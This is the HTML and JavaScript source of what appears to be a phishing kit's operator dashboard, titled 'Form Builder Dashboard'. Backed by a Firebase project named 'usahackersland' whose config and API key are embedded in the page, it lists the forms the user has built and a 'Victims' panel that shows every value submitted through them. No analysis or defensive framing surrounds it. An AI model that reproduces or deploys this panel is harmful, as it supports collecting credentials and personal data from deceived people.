<!DOCTYPE html><html>
<head>
  <title>ğŸ“‹ Form Builder Dashboard</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
  <style>
    body { font-family: Arial, sans-serif; background: #f4f6f9; margin: 0; }
    header { background: #4a90e2; color: white; padding: 20px; text-align: center; font-size: 24px; }
    .container { padding: 20px; }
    .nav { display: flex; justify-content: space-around; margin-bottom: 20px; }
    .nav button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
    .card { background: white; border-radius: 10px; padding: 15px; margin-bottom: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
    .logout { float: right; margin-top: -40px; background: #fff; color: #4a90e2; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; }
    .highlight { font-weight: bold; }
  </style>
</head>
<body>
  <header>
    ğŸ¨ Form Builder Dashboard
    <button class="logout" onclick="logout()">Logout</button>
  </header>
  <div class="container">
    <div class="nav">
      <button onclick="showSection('forms')">ğŸ“„ My Forms</button>
      <button onclick="showSection('victims')">ğŸ•µï¸ Victims</button>
      <button onclick="goToBuilder()">â• Create New Form</button>
    </div><div id="forms" class="section">
  <h3>ğŸ“„ Your Created Forms</h3>
  <div id="formsList">Loading forms...</div>
</div>

<div id="victims" class="section" style="display:none">
  <h3>ğŸ•µï¸ Victims Submissions</h3>
  <div id="victimsList">Loading victims...</div>
</div>

  </div><script>
  const firebaseConfig = {
    apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
    authDomain: "usahackersland.firebaseapp.com",
    projectId: "usahackersland",
    storageBucket: "usahackersland.appspot.com",
    messagingSenderId: "588407428267",
    appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
  };
  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();
  const auth = firebase.auth();

  let currentUserEmail = "";

  auth.onAuthStateChanged(user => {
    if (user) {
      currentUserEmail = user.email;
      loadForms();
      loadVictims();
    } else {
      location.href = "login.html";
    }
  });

  function logout() {
    auth.signOut().then(() => location.href = "login.html");
  }

  function goToBuilder() {
    location.href = "index.html";
  }

  function showSection(id) {
    document.querySelectorAll('.section').forEach(div => div.style.display = 'none');
    document.getElementById(id).style.display = 'block';
  }

  function loadForms() {
    db.collection("forms").where("formOwner", "==", currentUserEmail).get().then(snapshot => {
      const container = document.getElementById("formsList");
      container.innerHTML = "";
      if (snapshot.empty) {
        container.innerHTML = "<p>No forms found.</p>";
        return;
      }
      snapshot.forEach(doc => {
        const data = doc.data();
        const div = document.createElement("div");
        div.className = "card";
        div.innerHTML = `
          <div class="highlight">Title:</div> ${data.title || 'No title'}<br>
          <div class="highlight">Created:</div> ${new Date(data.createdAt).toLocaleString()}<br>
          <div class="highlight">Link:</div> <a href="form.html?id=${doc.id}" target="_blank">Open Form</a>
        `;
        container.appendChild(div);
      });
    });
  }

  function loadVictims() {
    db.collection("victims").where("formOwner", "==", currentUserEmail).get().then(snapshot => {
      const container = document.getElementById("victimsList");
      container.innerHTML = "";
      if (snapshot.empty) {
        container.innerHTML = "<p>No victim submissions yet.</p>";
        return;
      }
      snapshot.forEach(doc => {
        const data = doc.data();
        const div = document.createElement("div");
        div.className = "card";
        div.innerHTML = `
          <div class="highlight">Date:</div> ${new Date(data.createdAt).toLocaleString()}<br>
          <div class="highlight">Submitted:</div><br>
          ${Object.keys(data).map(k => `${k}: ${data[k]}`).join("<br>")}
        `;
        container.appendChild(div);
      });
    });
  }
</script></body>
</html>
